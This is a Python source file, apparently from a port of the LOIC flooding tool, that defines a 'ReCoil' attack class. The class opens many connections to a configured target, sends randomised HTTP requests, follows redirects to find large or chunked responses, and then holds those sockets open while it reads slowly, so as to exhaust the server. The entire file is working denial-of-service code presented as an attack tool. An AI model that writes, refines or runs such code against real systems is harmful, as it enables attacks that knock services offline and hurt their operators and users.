from __future__ import annotations

import asyncio
import logging
import socket
import ssl
import time
from urllib.parse import urlparse

from loic.flooders.base import AsyncFlooder
from loic.config import AttackConfig
from loic.functions import random_http_header
from loic.req_state import ReqState

logger = logging.getLogger(__name__)

RECV_BUF_SIZE = 4096


class ReCoil(AsyncFlooder):
    def __init__(self, config: AttackConfig):
        super().__init__()
        self.dns = config.effective_host()
        self.ip = config.target_ip
        self.port = config.port
        self.subsite = config.subsite
        self.n_sockets = config.socks_per_thread
        self.timeout = 30000 if config.timeout <= 0 else config.timeout * 1000
        self._delay = config.delay + 1
        self.random_sub = config.random_sub
        self.use_gzip = config.allow_gzip
        self.resp = config.wait_reply
        self.ipv6 = config.ipv6
        self.use_tls = config.use_tls
        self.is_delayed = True
        self._sockets: list = []

    async def _run(self):
        try:
            timeout_sec = self.timeout / 1000.0
            delay_sec = self._delay / 1000.0
            family = socket.AF_INET6 if self.ipv6 else socket.AF_INET
            min_content_length = 16384

            self.state = ReqState.IDLE
            while self._is_flooding:
                stop_at = time.monotonic() + timeout_sec
                self.state = ReqState.CONNECTING

                while self._is_flooding and self.is_delayed and time.monotonic() < stop_at:
                    redirect = ""
                    reader = writer = None

                    try:
                        reader, writer = await asyncio.wait_for(
                            asyncio.open_connection(self.ip, self.port, family=family),
                            timeout=timeout_sec,
                        )
                        sbuf = random_http_header("GET", self.subsite, self.dns, self.random_sub, self.use_gzip, 300)
                        writer.write(sbuf)
                        await writer.drain()
                    except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
                        if writer:
                            try:
                                writer.close()
                                await writer.wait_closed()
                            except Exception:
                                pass
                        if delay_sec > 0:
                            await asyncio.sleep(delay_sec)
                        continue

                    keeps = not self.resp
                    if self.resp:
                        while redirect and time.monotonic() < stop_at:
                            if writer:
                                sbuf = random_http_header("GET", redirect, self.dns, False, self.use_gzip, 300)
                                writer.write(sbuf)
                                await writer.drain()
                                redirect = ""

                        keeps = False
                        try:
                            header_data = b""
                            while b"\r\n\r\n" not in header_data and time.monotonic() < stop_at:
                                chunk = await asyncio.wait_for(reader.read(RECV_BUF_SIZE), timeout=5.0)
                                if not chunk:
                                    break
                                header_data += chunk

                            for line in reversed(header_data.replace(b"\r", b"").split(b"\n")):
                                if b":" not in line:
                                    continue
                                parts = line.split(b":", 1)
                                if len(parts) != 2:
                                    continue
                                key = parts[0].strip().decode("ascii", errors="ignore")
                                val = parts[1].strip().decode("ascii", errors="ignore")

                                if key.lower() == "location":
                                    redirect = val
                                    if not redirect.startswith("/"):
                                        try:
                                            parsed = urlparse(redirect)
                                            redirect = parsed.path + (f"?{parsed.query}" if parsed.query else "")
                                        except Exception:
                                            redirect = ""
                                    break
                                elif key.lower() == "content-length":
                                    try:
                                        if int(val) >= min_content_length:
                                            keeps = True
                                            break
                                    except ValueError:
                                        pass
                                elif key.lower() == "transfer-encoding" and val.lower() == "chunked":
                                    keeps = True
                                    break
                        except (asyncio.TimeoutError, OSError):
                            pass

                        if not keeps:
                            self.failed += 1

                    if keeps and reader and writer:
                        self._sockets.append((reader, writer))
                        self.requested += 1
                    else:
                        try:
                            writer.close()
                            await writer.wait_closed()
                        except Exception:
                            pass

                    if len(self._sockets) >= self.n_sockets:
                        self.is_delayed = False
                    elif delay_sec > 0:
                        await asyncio.sleep(delay_sec)

                self.state = ReqState.DOWNLOADING
                for i in range(len(self._sockets) - 1, -1, -1):
                    if not self._is_flooding:
                        break
                    try:
                        reader, writer = self._sockets[i]
                        data = await asyncio.wait_for(reader.read(RECV_BUF_SIZE), timeout=5.0)
                        if data and len(data) >= 16:
                            self.downloaded += 1
                        else:
                            self._sockets.pop(i)
                            self.failed += 1
                            self.requested -= 1
                    except (asyncio.TimeoutError, ConnectionResetError, OSError):
                        try:
                            self._sockets.pop(i)[1].close()
                        except Exception:
                            pass
                        self.failed += 1
                        self.requested -= 1

                self.state = ReqState.COMPLETED
                self.is_delayed = len(self._sockets) < self.n_sockets
                if not self.is_delayed:
                    await asyncio.sleep(timeout_sec)

        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error("ReCoil error: %s", e)
            self.state = ReqState.FAILED
        finally:
            await self.cleanup()

    async def cleanup(self):
        for reader, writer in self._sockets:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
        self._sockets.clear()
        self.state = ReqState.IDLE
        self.is_delayed = True